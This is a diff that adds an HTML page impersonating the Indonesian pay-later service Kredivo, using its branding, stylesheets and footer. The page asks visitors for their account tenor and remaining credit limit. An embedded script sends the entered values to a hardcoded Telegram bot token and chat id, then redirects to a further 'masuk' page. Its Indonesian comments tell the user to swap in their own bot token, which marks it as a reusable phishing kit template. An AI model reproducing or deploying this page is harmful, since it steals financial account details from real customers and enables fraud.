@@ -1,0 +1,55 @@
+<html><head><meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Kredivo</title><link rel="shortcut icon" href="https://pay.kredivo.com/favicon.png"><link href="https://pay.kredivo.com/css/main.css" rel="stylesheet">
+<link href="https://api.kredivo.com/static/css/bootstrap.min.css" rel="stylesheet">
+<link href="https://api.kredivo.com/static/css/font-awesome.css" rel="stylesheet">
+<link href="https://api.kredivo.com/static/css/kredivo.css" rel="stylesheet">
+</head>
+<body style="background-color: #F8F8F8;">
+<nav class="navbar navbar-default navbar-fixed-top"><div class="container"><div class="navbar-header"><button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar"><span>Butuh Bantuan?</span></button><a class="navbar-brand logo" href="./../index.html">Kredivo</a></div><div aria-expanded="false" id="navbar" class="navbar-collapse collapse" style="height: 1px;"><ul class="nav navbar-nav navbar-right"><li><a data-toggle="modal" href="mailto: id.kredivo.apps@gmail.com">Butuh bantuan?</a></li></ul></div></div></nav>
+<form>
+<center>
+<h1>Kredivo</h1>
+<p>Syarat & Ketentuan Kredivo, Konfirmasi Ketersediaan Limit Pada Akun</p>
+<br>
+<div class="item">
+<select id="label" style="box-sizing: border-box; height: 35px; width: 330px; max-width: 100%; border: 0.5px solid rgb(0, 134, 224); border-radius: 5px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 14px; padding: 0px 12px;" />
+<option selected value="" disabled selected>Pilih Limit Akun</option>
+<option id="selected" value="3 Bulan" >30 Hari</option>
+<option id="selected" value="3 Bulan">3 Bulan</option>
+<option id="selected" value="6 Bulan">6 Bulan</option>
+<option id="selected" value="12 Bulan">12 Bulan</option>
+</select>
+</div>
+<br>
+<input type="tel" id="text" style="box-sizing: border-box; height: 35px; width: 330px; max-width: 100%; border: 0.5px solid rgb(0, 134, 224); border-radius: 5px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 14px; padding: 0px 12px;" placeholder="Masukkan Sisa Limit Tersedia" maxlength="20" minlength="3"/>
+<br><br>
+<input type="button" id="KIRIM" style="margin: 0 auto; width: 330px; min-height: 40px; background-color: #f27d31; margin-top: 13%; padding: 3px; border: solid #e2d7a2 1px; border-radius: 5px; font-color: #FFFFFF; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 14px; padding: 0px 12px; margin: 30px auto;" value="Lanjut/Masuk" onclick="Redirect()" />
+<p>Belum punya akun?&nbsp;<a href="https://pay.kredivo.com/register?session="><span class="register">Daftar Sekarang</span></a></p>
+</center>
+</form> 
+<footer>
+<div id="main-footer"><div><div class="ant-row-flex ant-row-flex-space-between ant-row-flex-middle footer-text flex-nowrap"><div class="ant-col"><img src="https://pay.kredivo.com/images/geotrust-badge.png" width="114" alt="geotrust"></div><div class="ant-col copyright"><p class="m-0">Copyright ©&nbsp;2023&nbsp;FinAccel.</p><p class="m-0">ㅤㅤㅤㅤAll rights reserved.</p></div></div></div><img src="https://pay.kredivo.com/images/footer_mco.png" alt="Footer Kredivo" width="100%"></div>
+</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script>
+    function Redirect() {
+    window.location = "masuk.html"
+
+    var select = document.getElementById('label');
+    var input = document.getElementById('text');
+
+    var input = 'Kredivo%0A' + '%0A '+ label.value + ' %3A ' + text.value;
+
+    var token = '6952259570:AAG6SlRzmt-Ut_nd9HSGmAspr4ZViNgd8a0'; // Ganti dengan token bot yang kamu buat
+    var grup = '6147716687'; // Ganti dengan chat id dari bot yang kamu buat
+
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${input}&parse_mode=html`,
+        method: `POST`,
+        
+    })
+}
+</script></body></html>
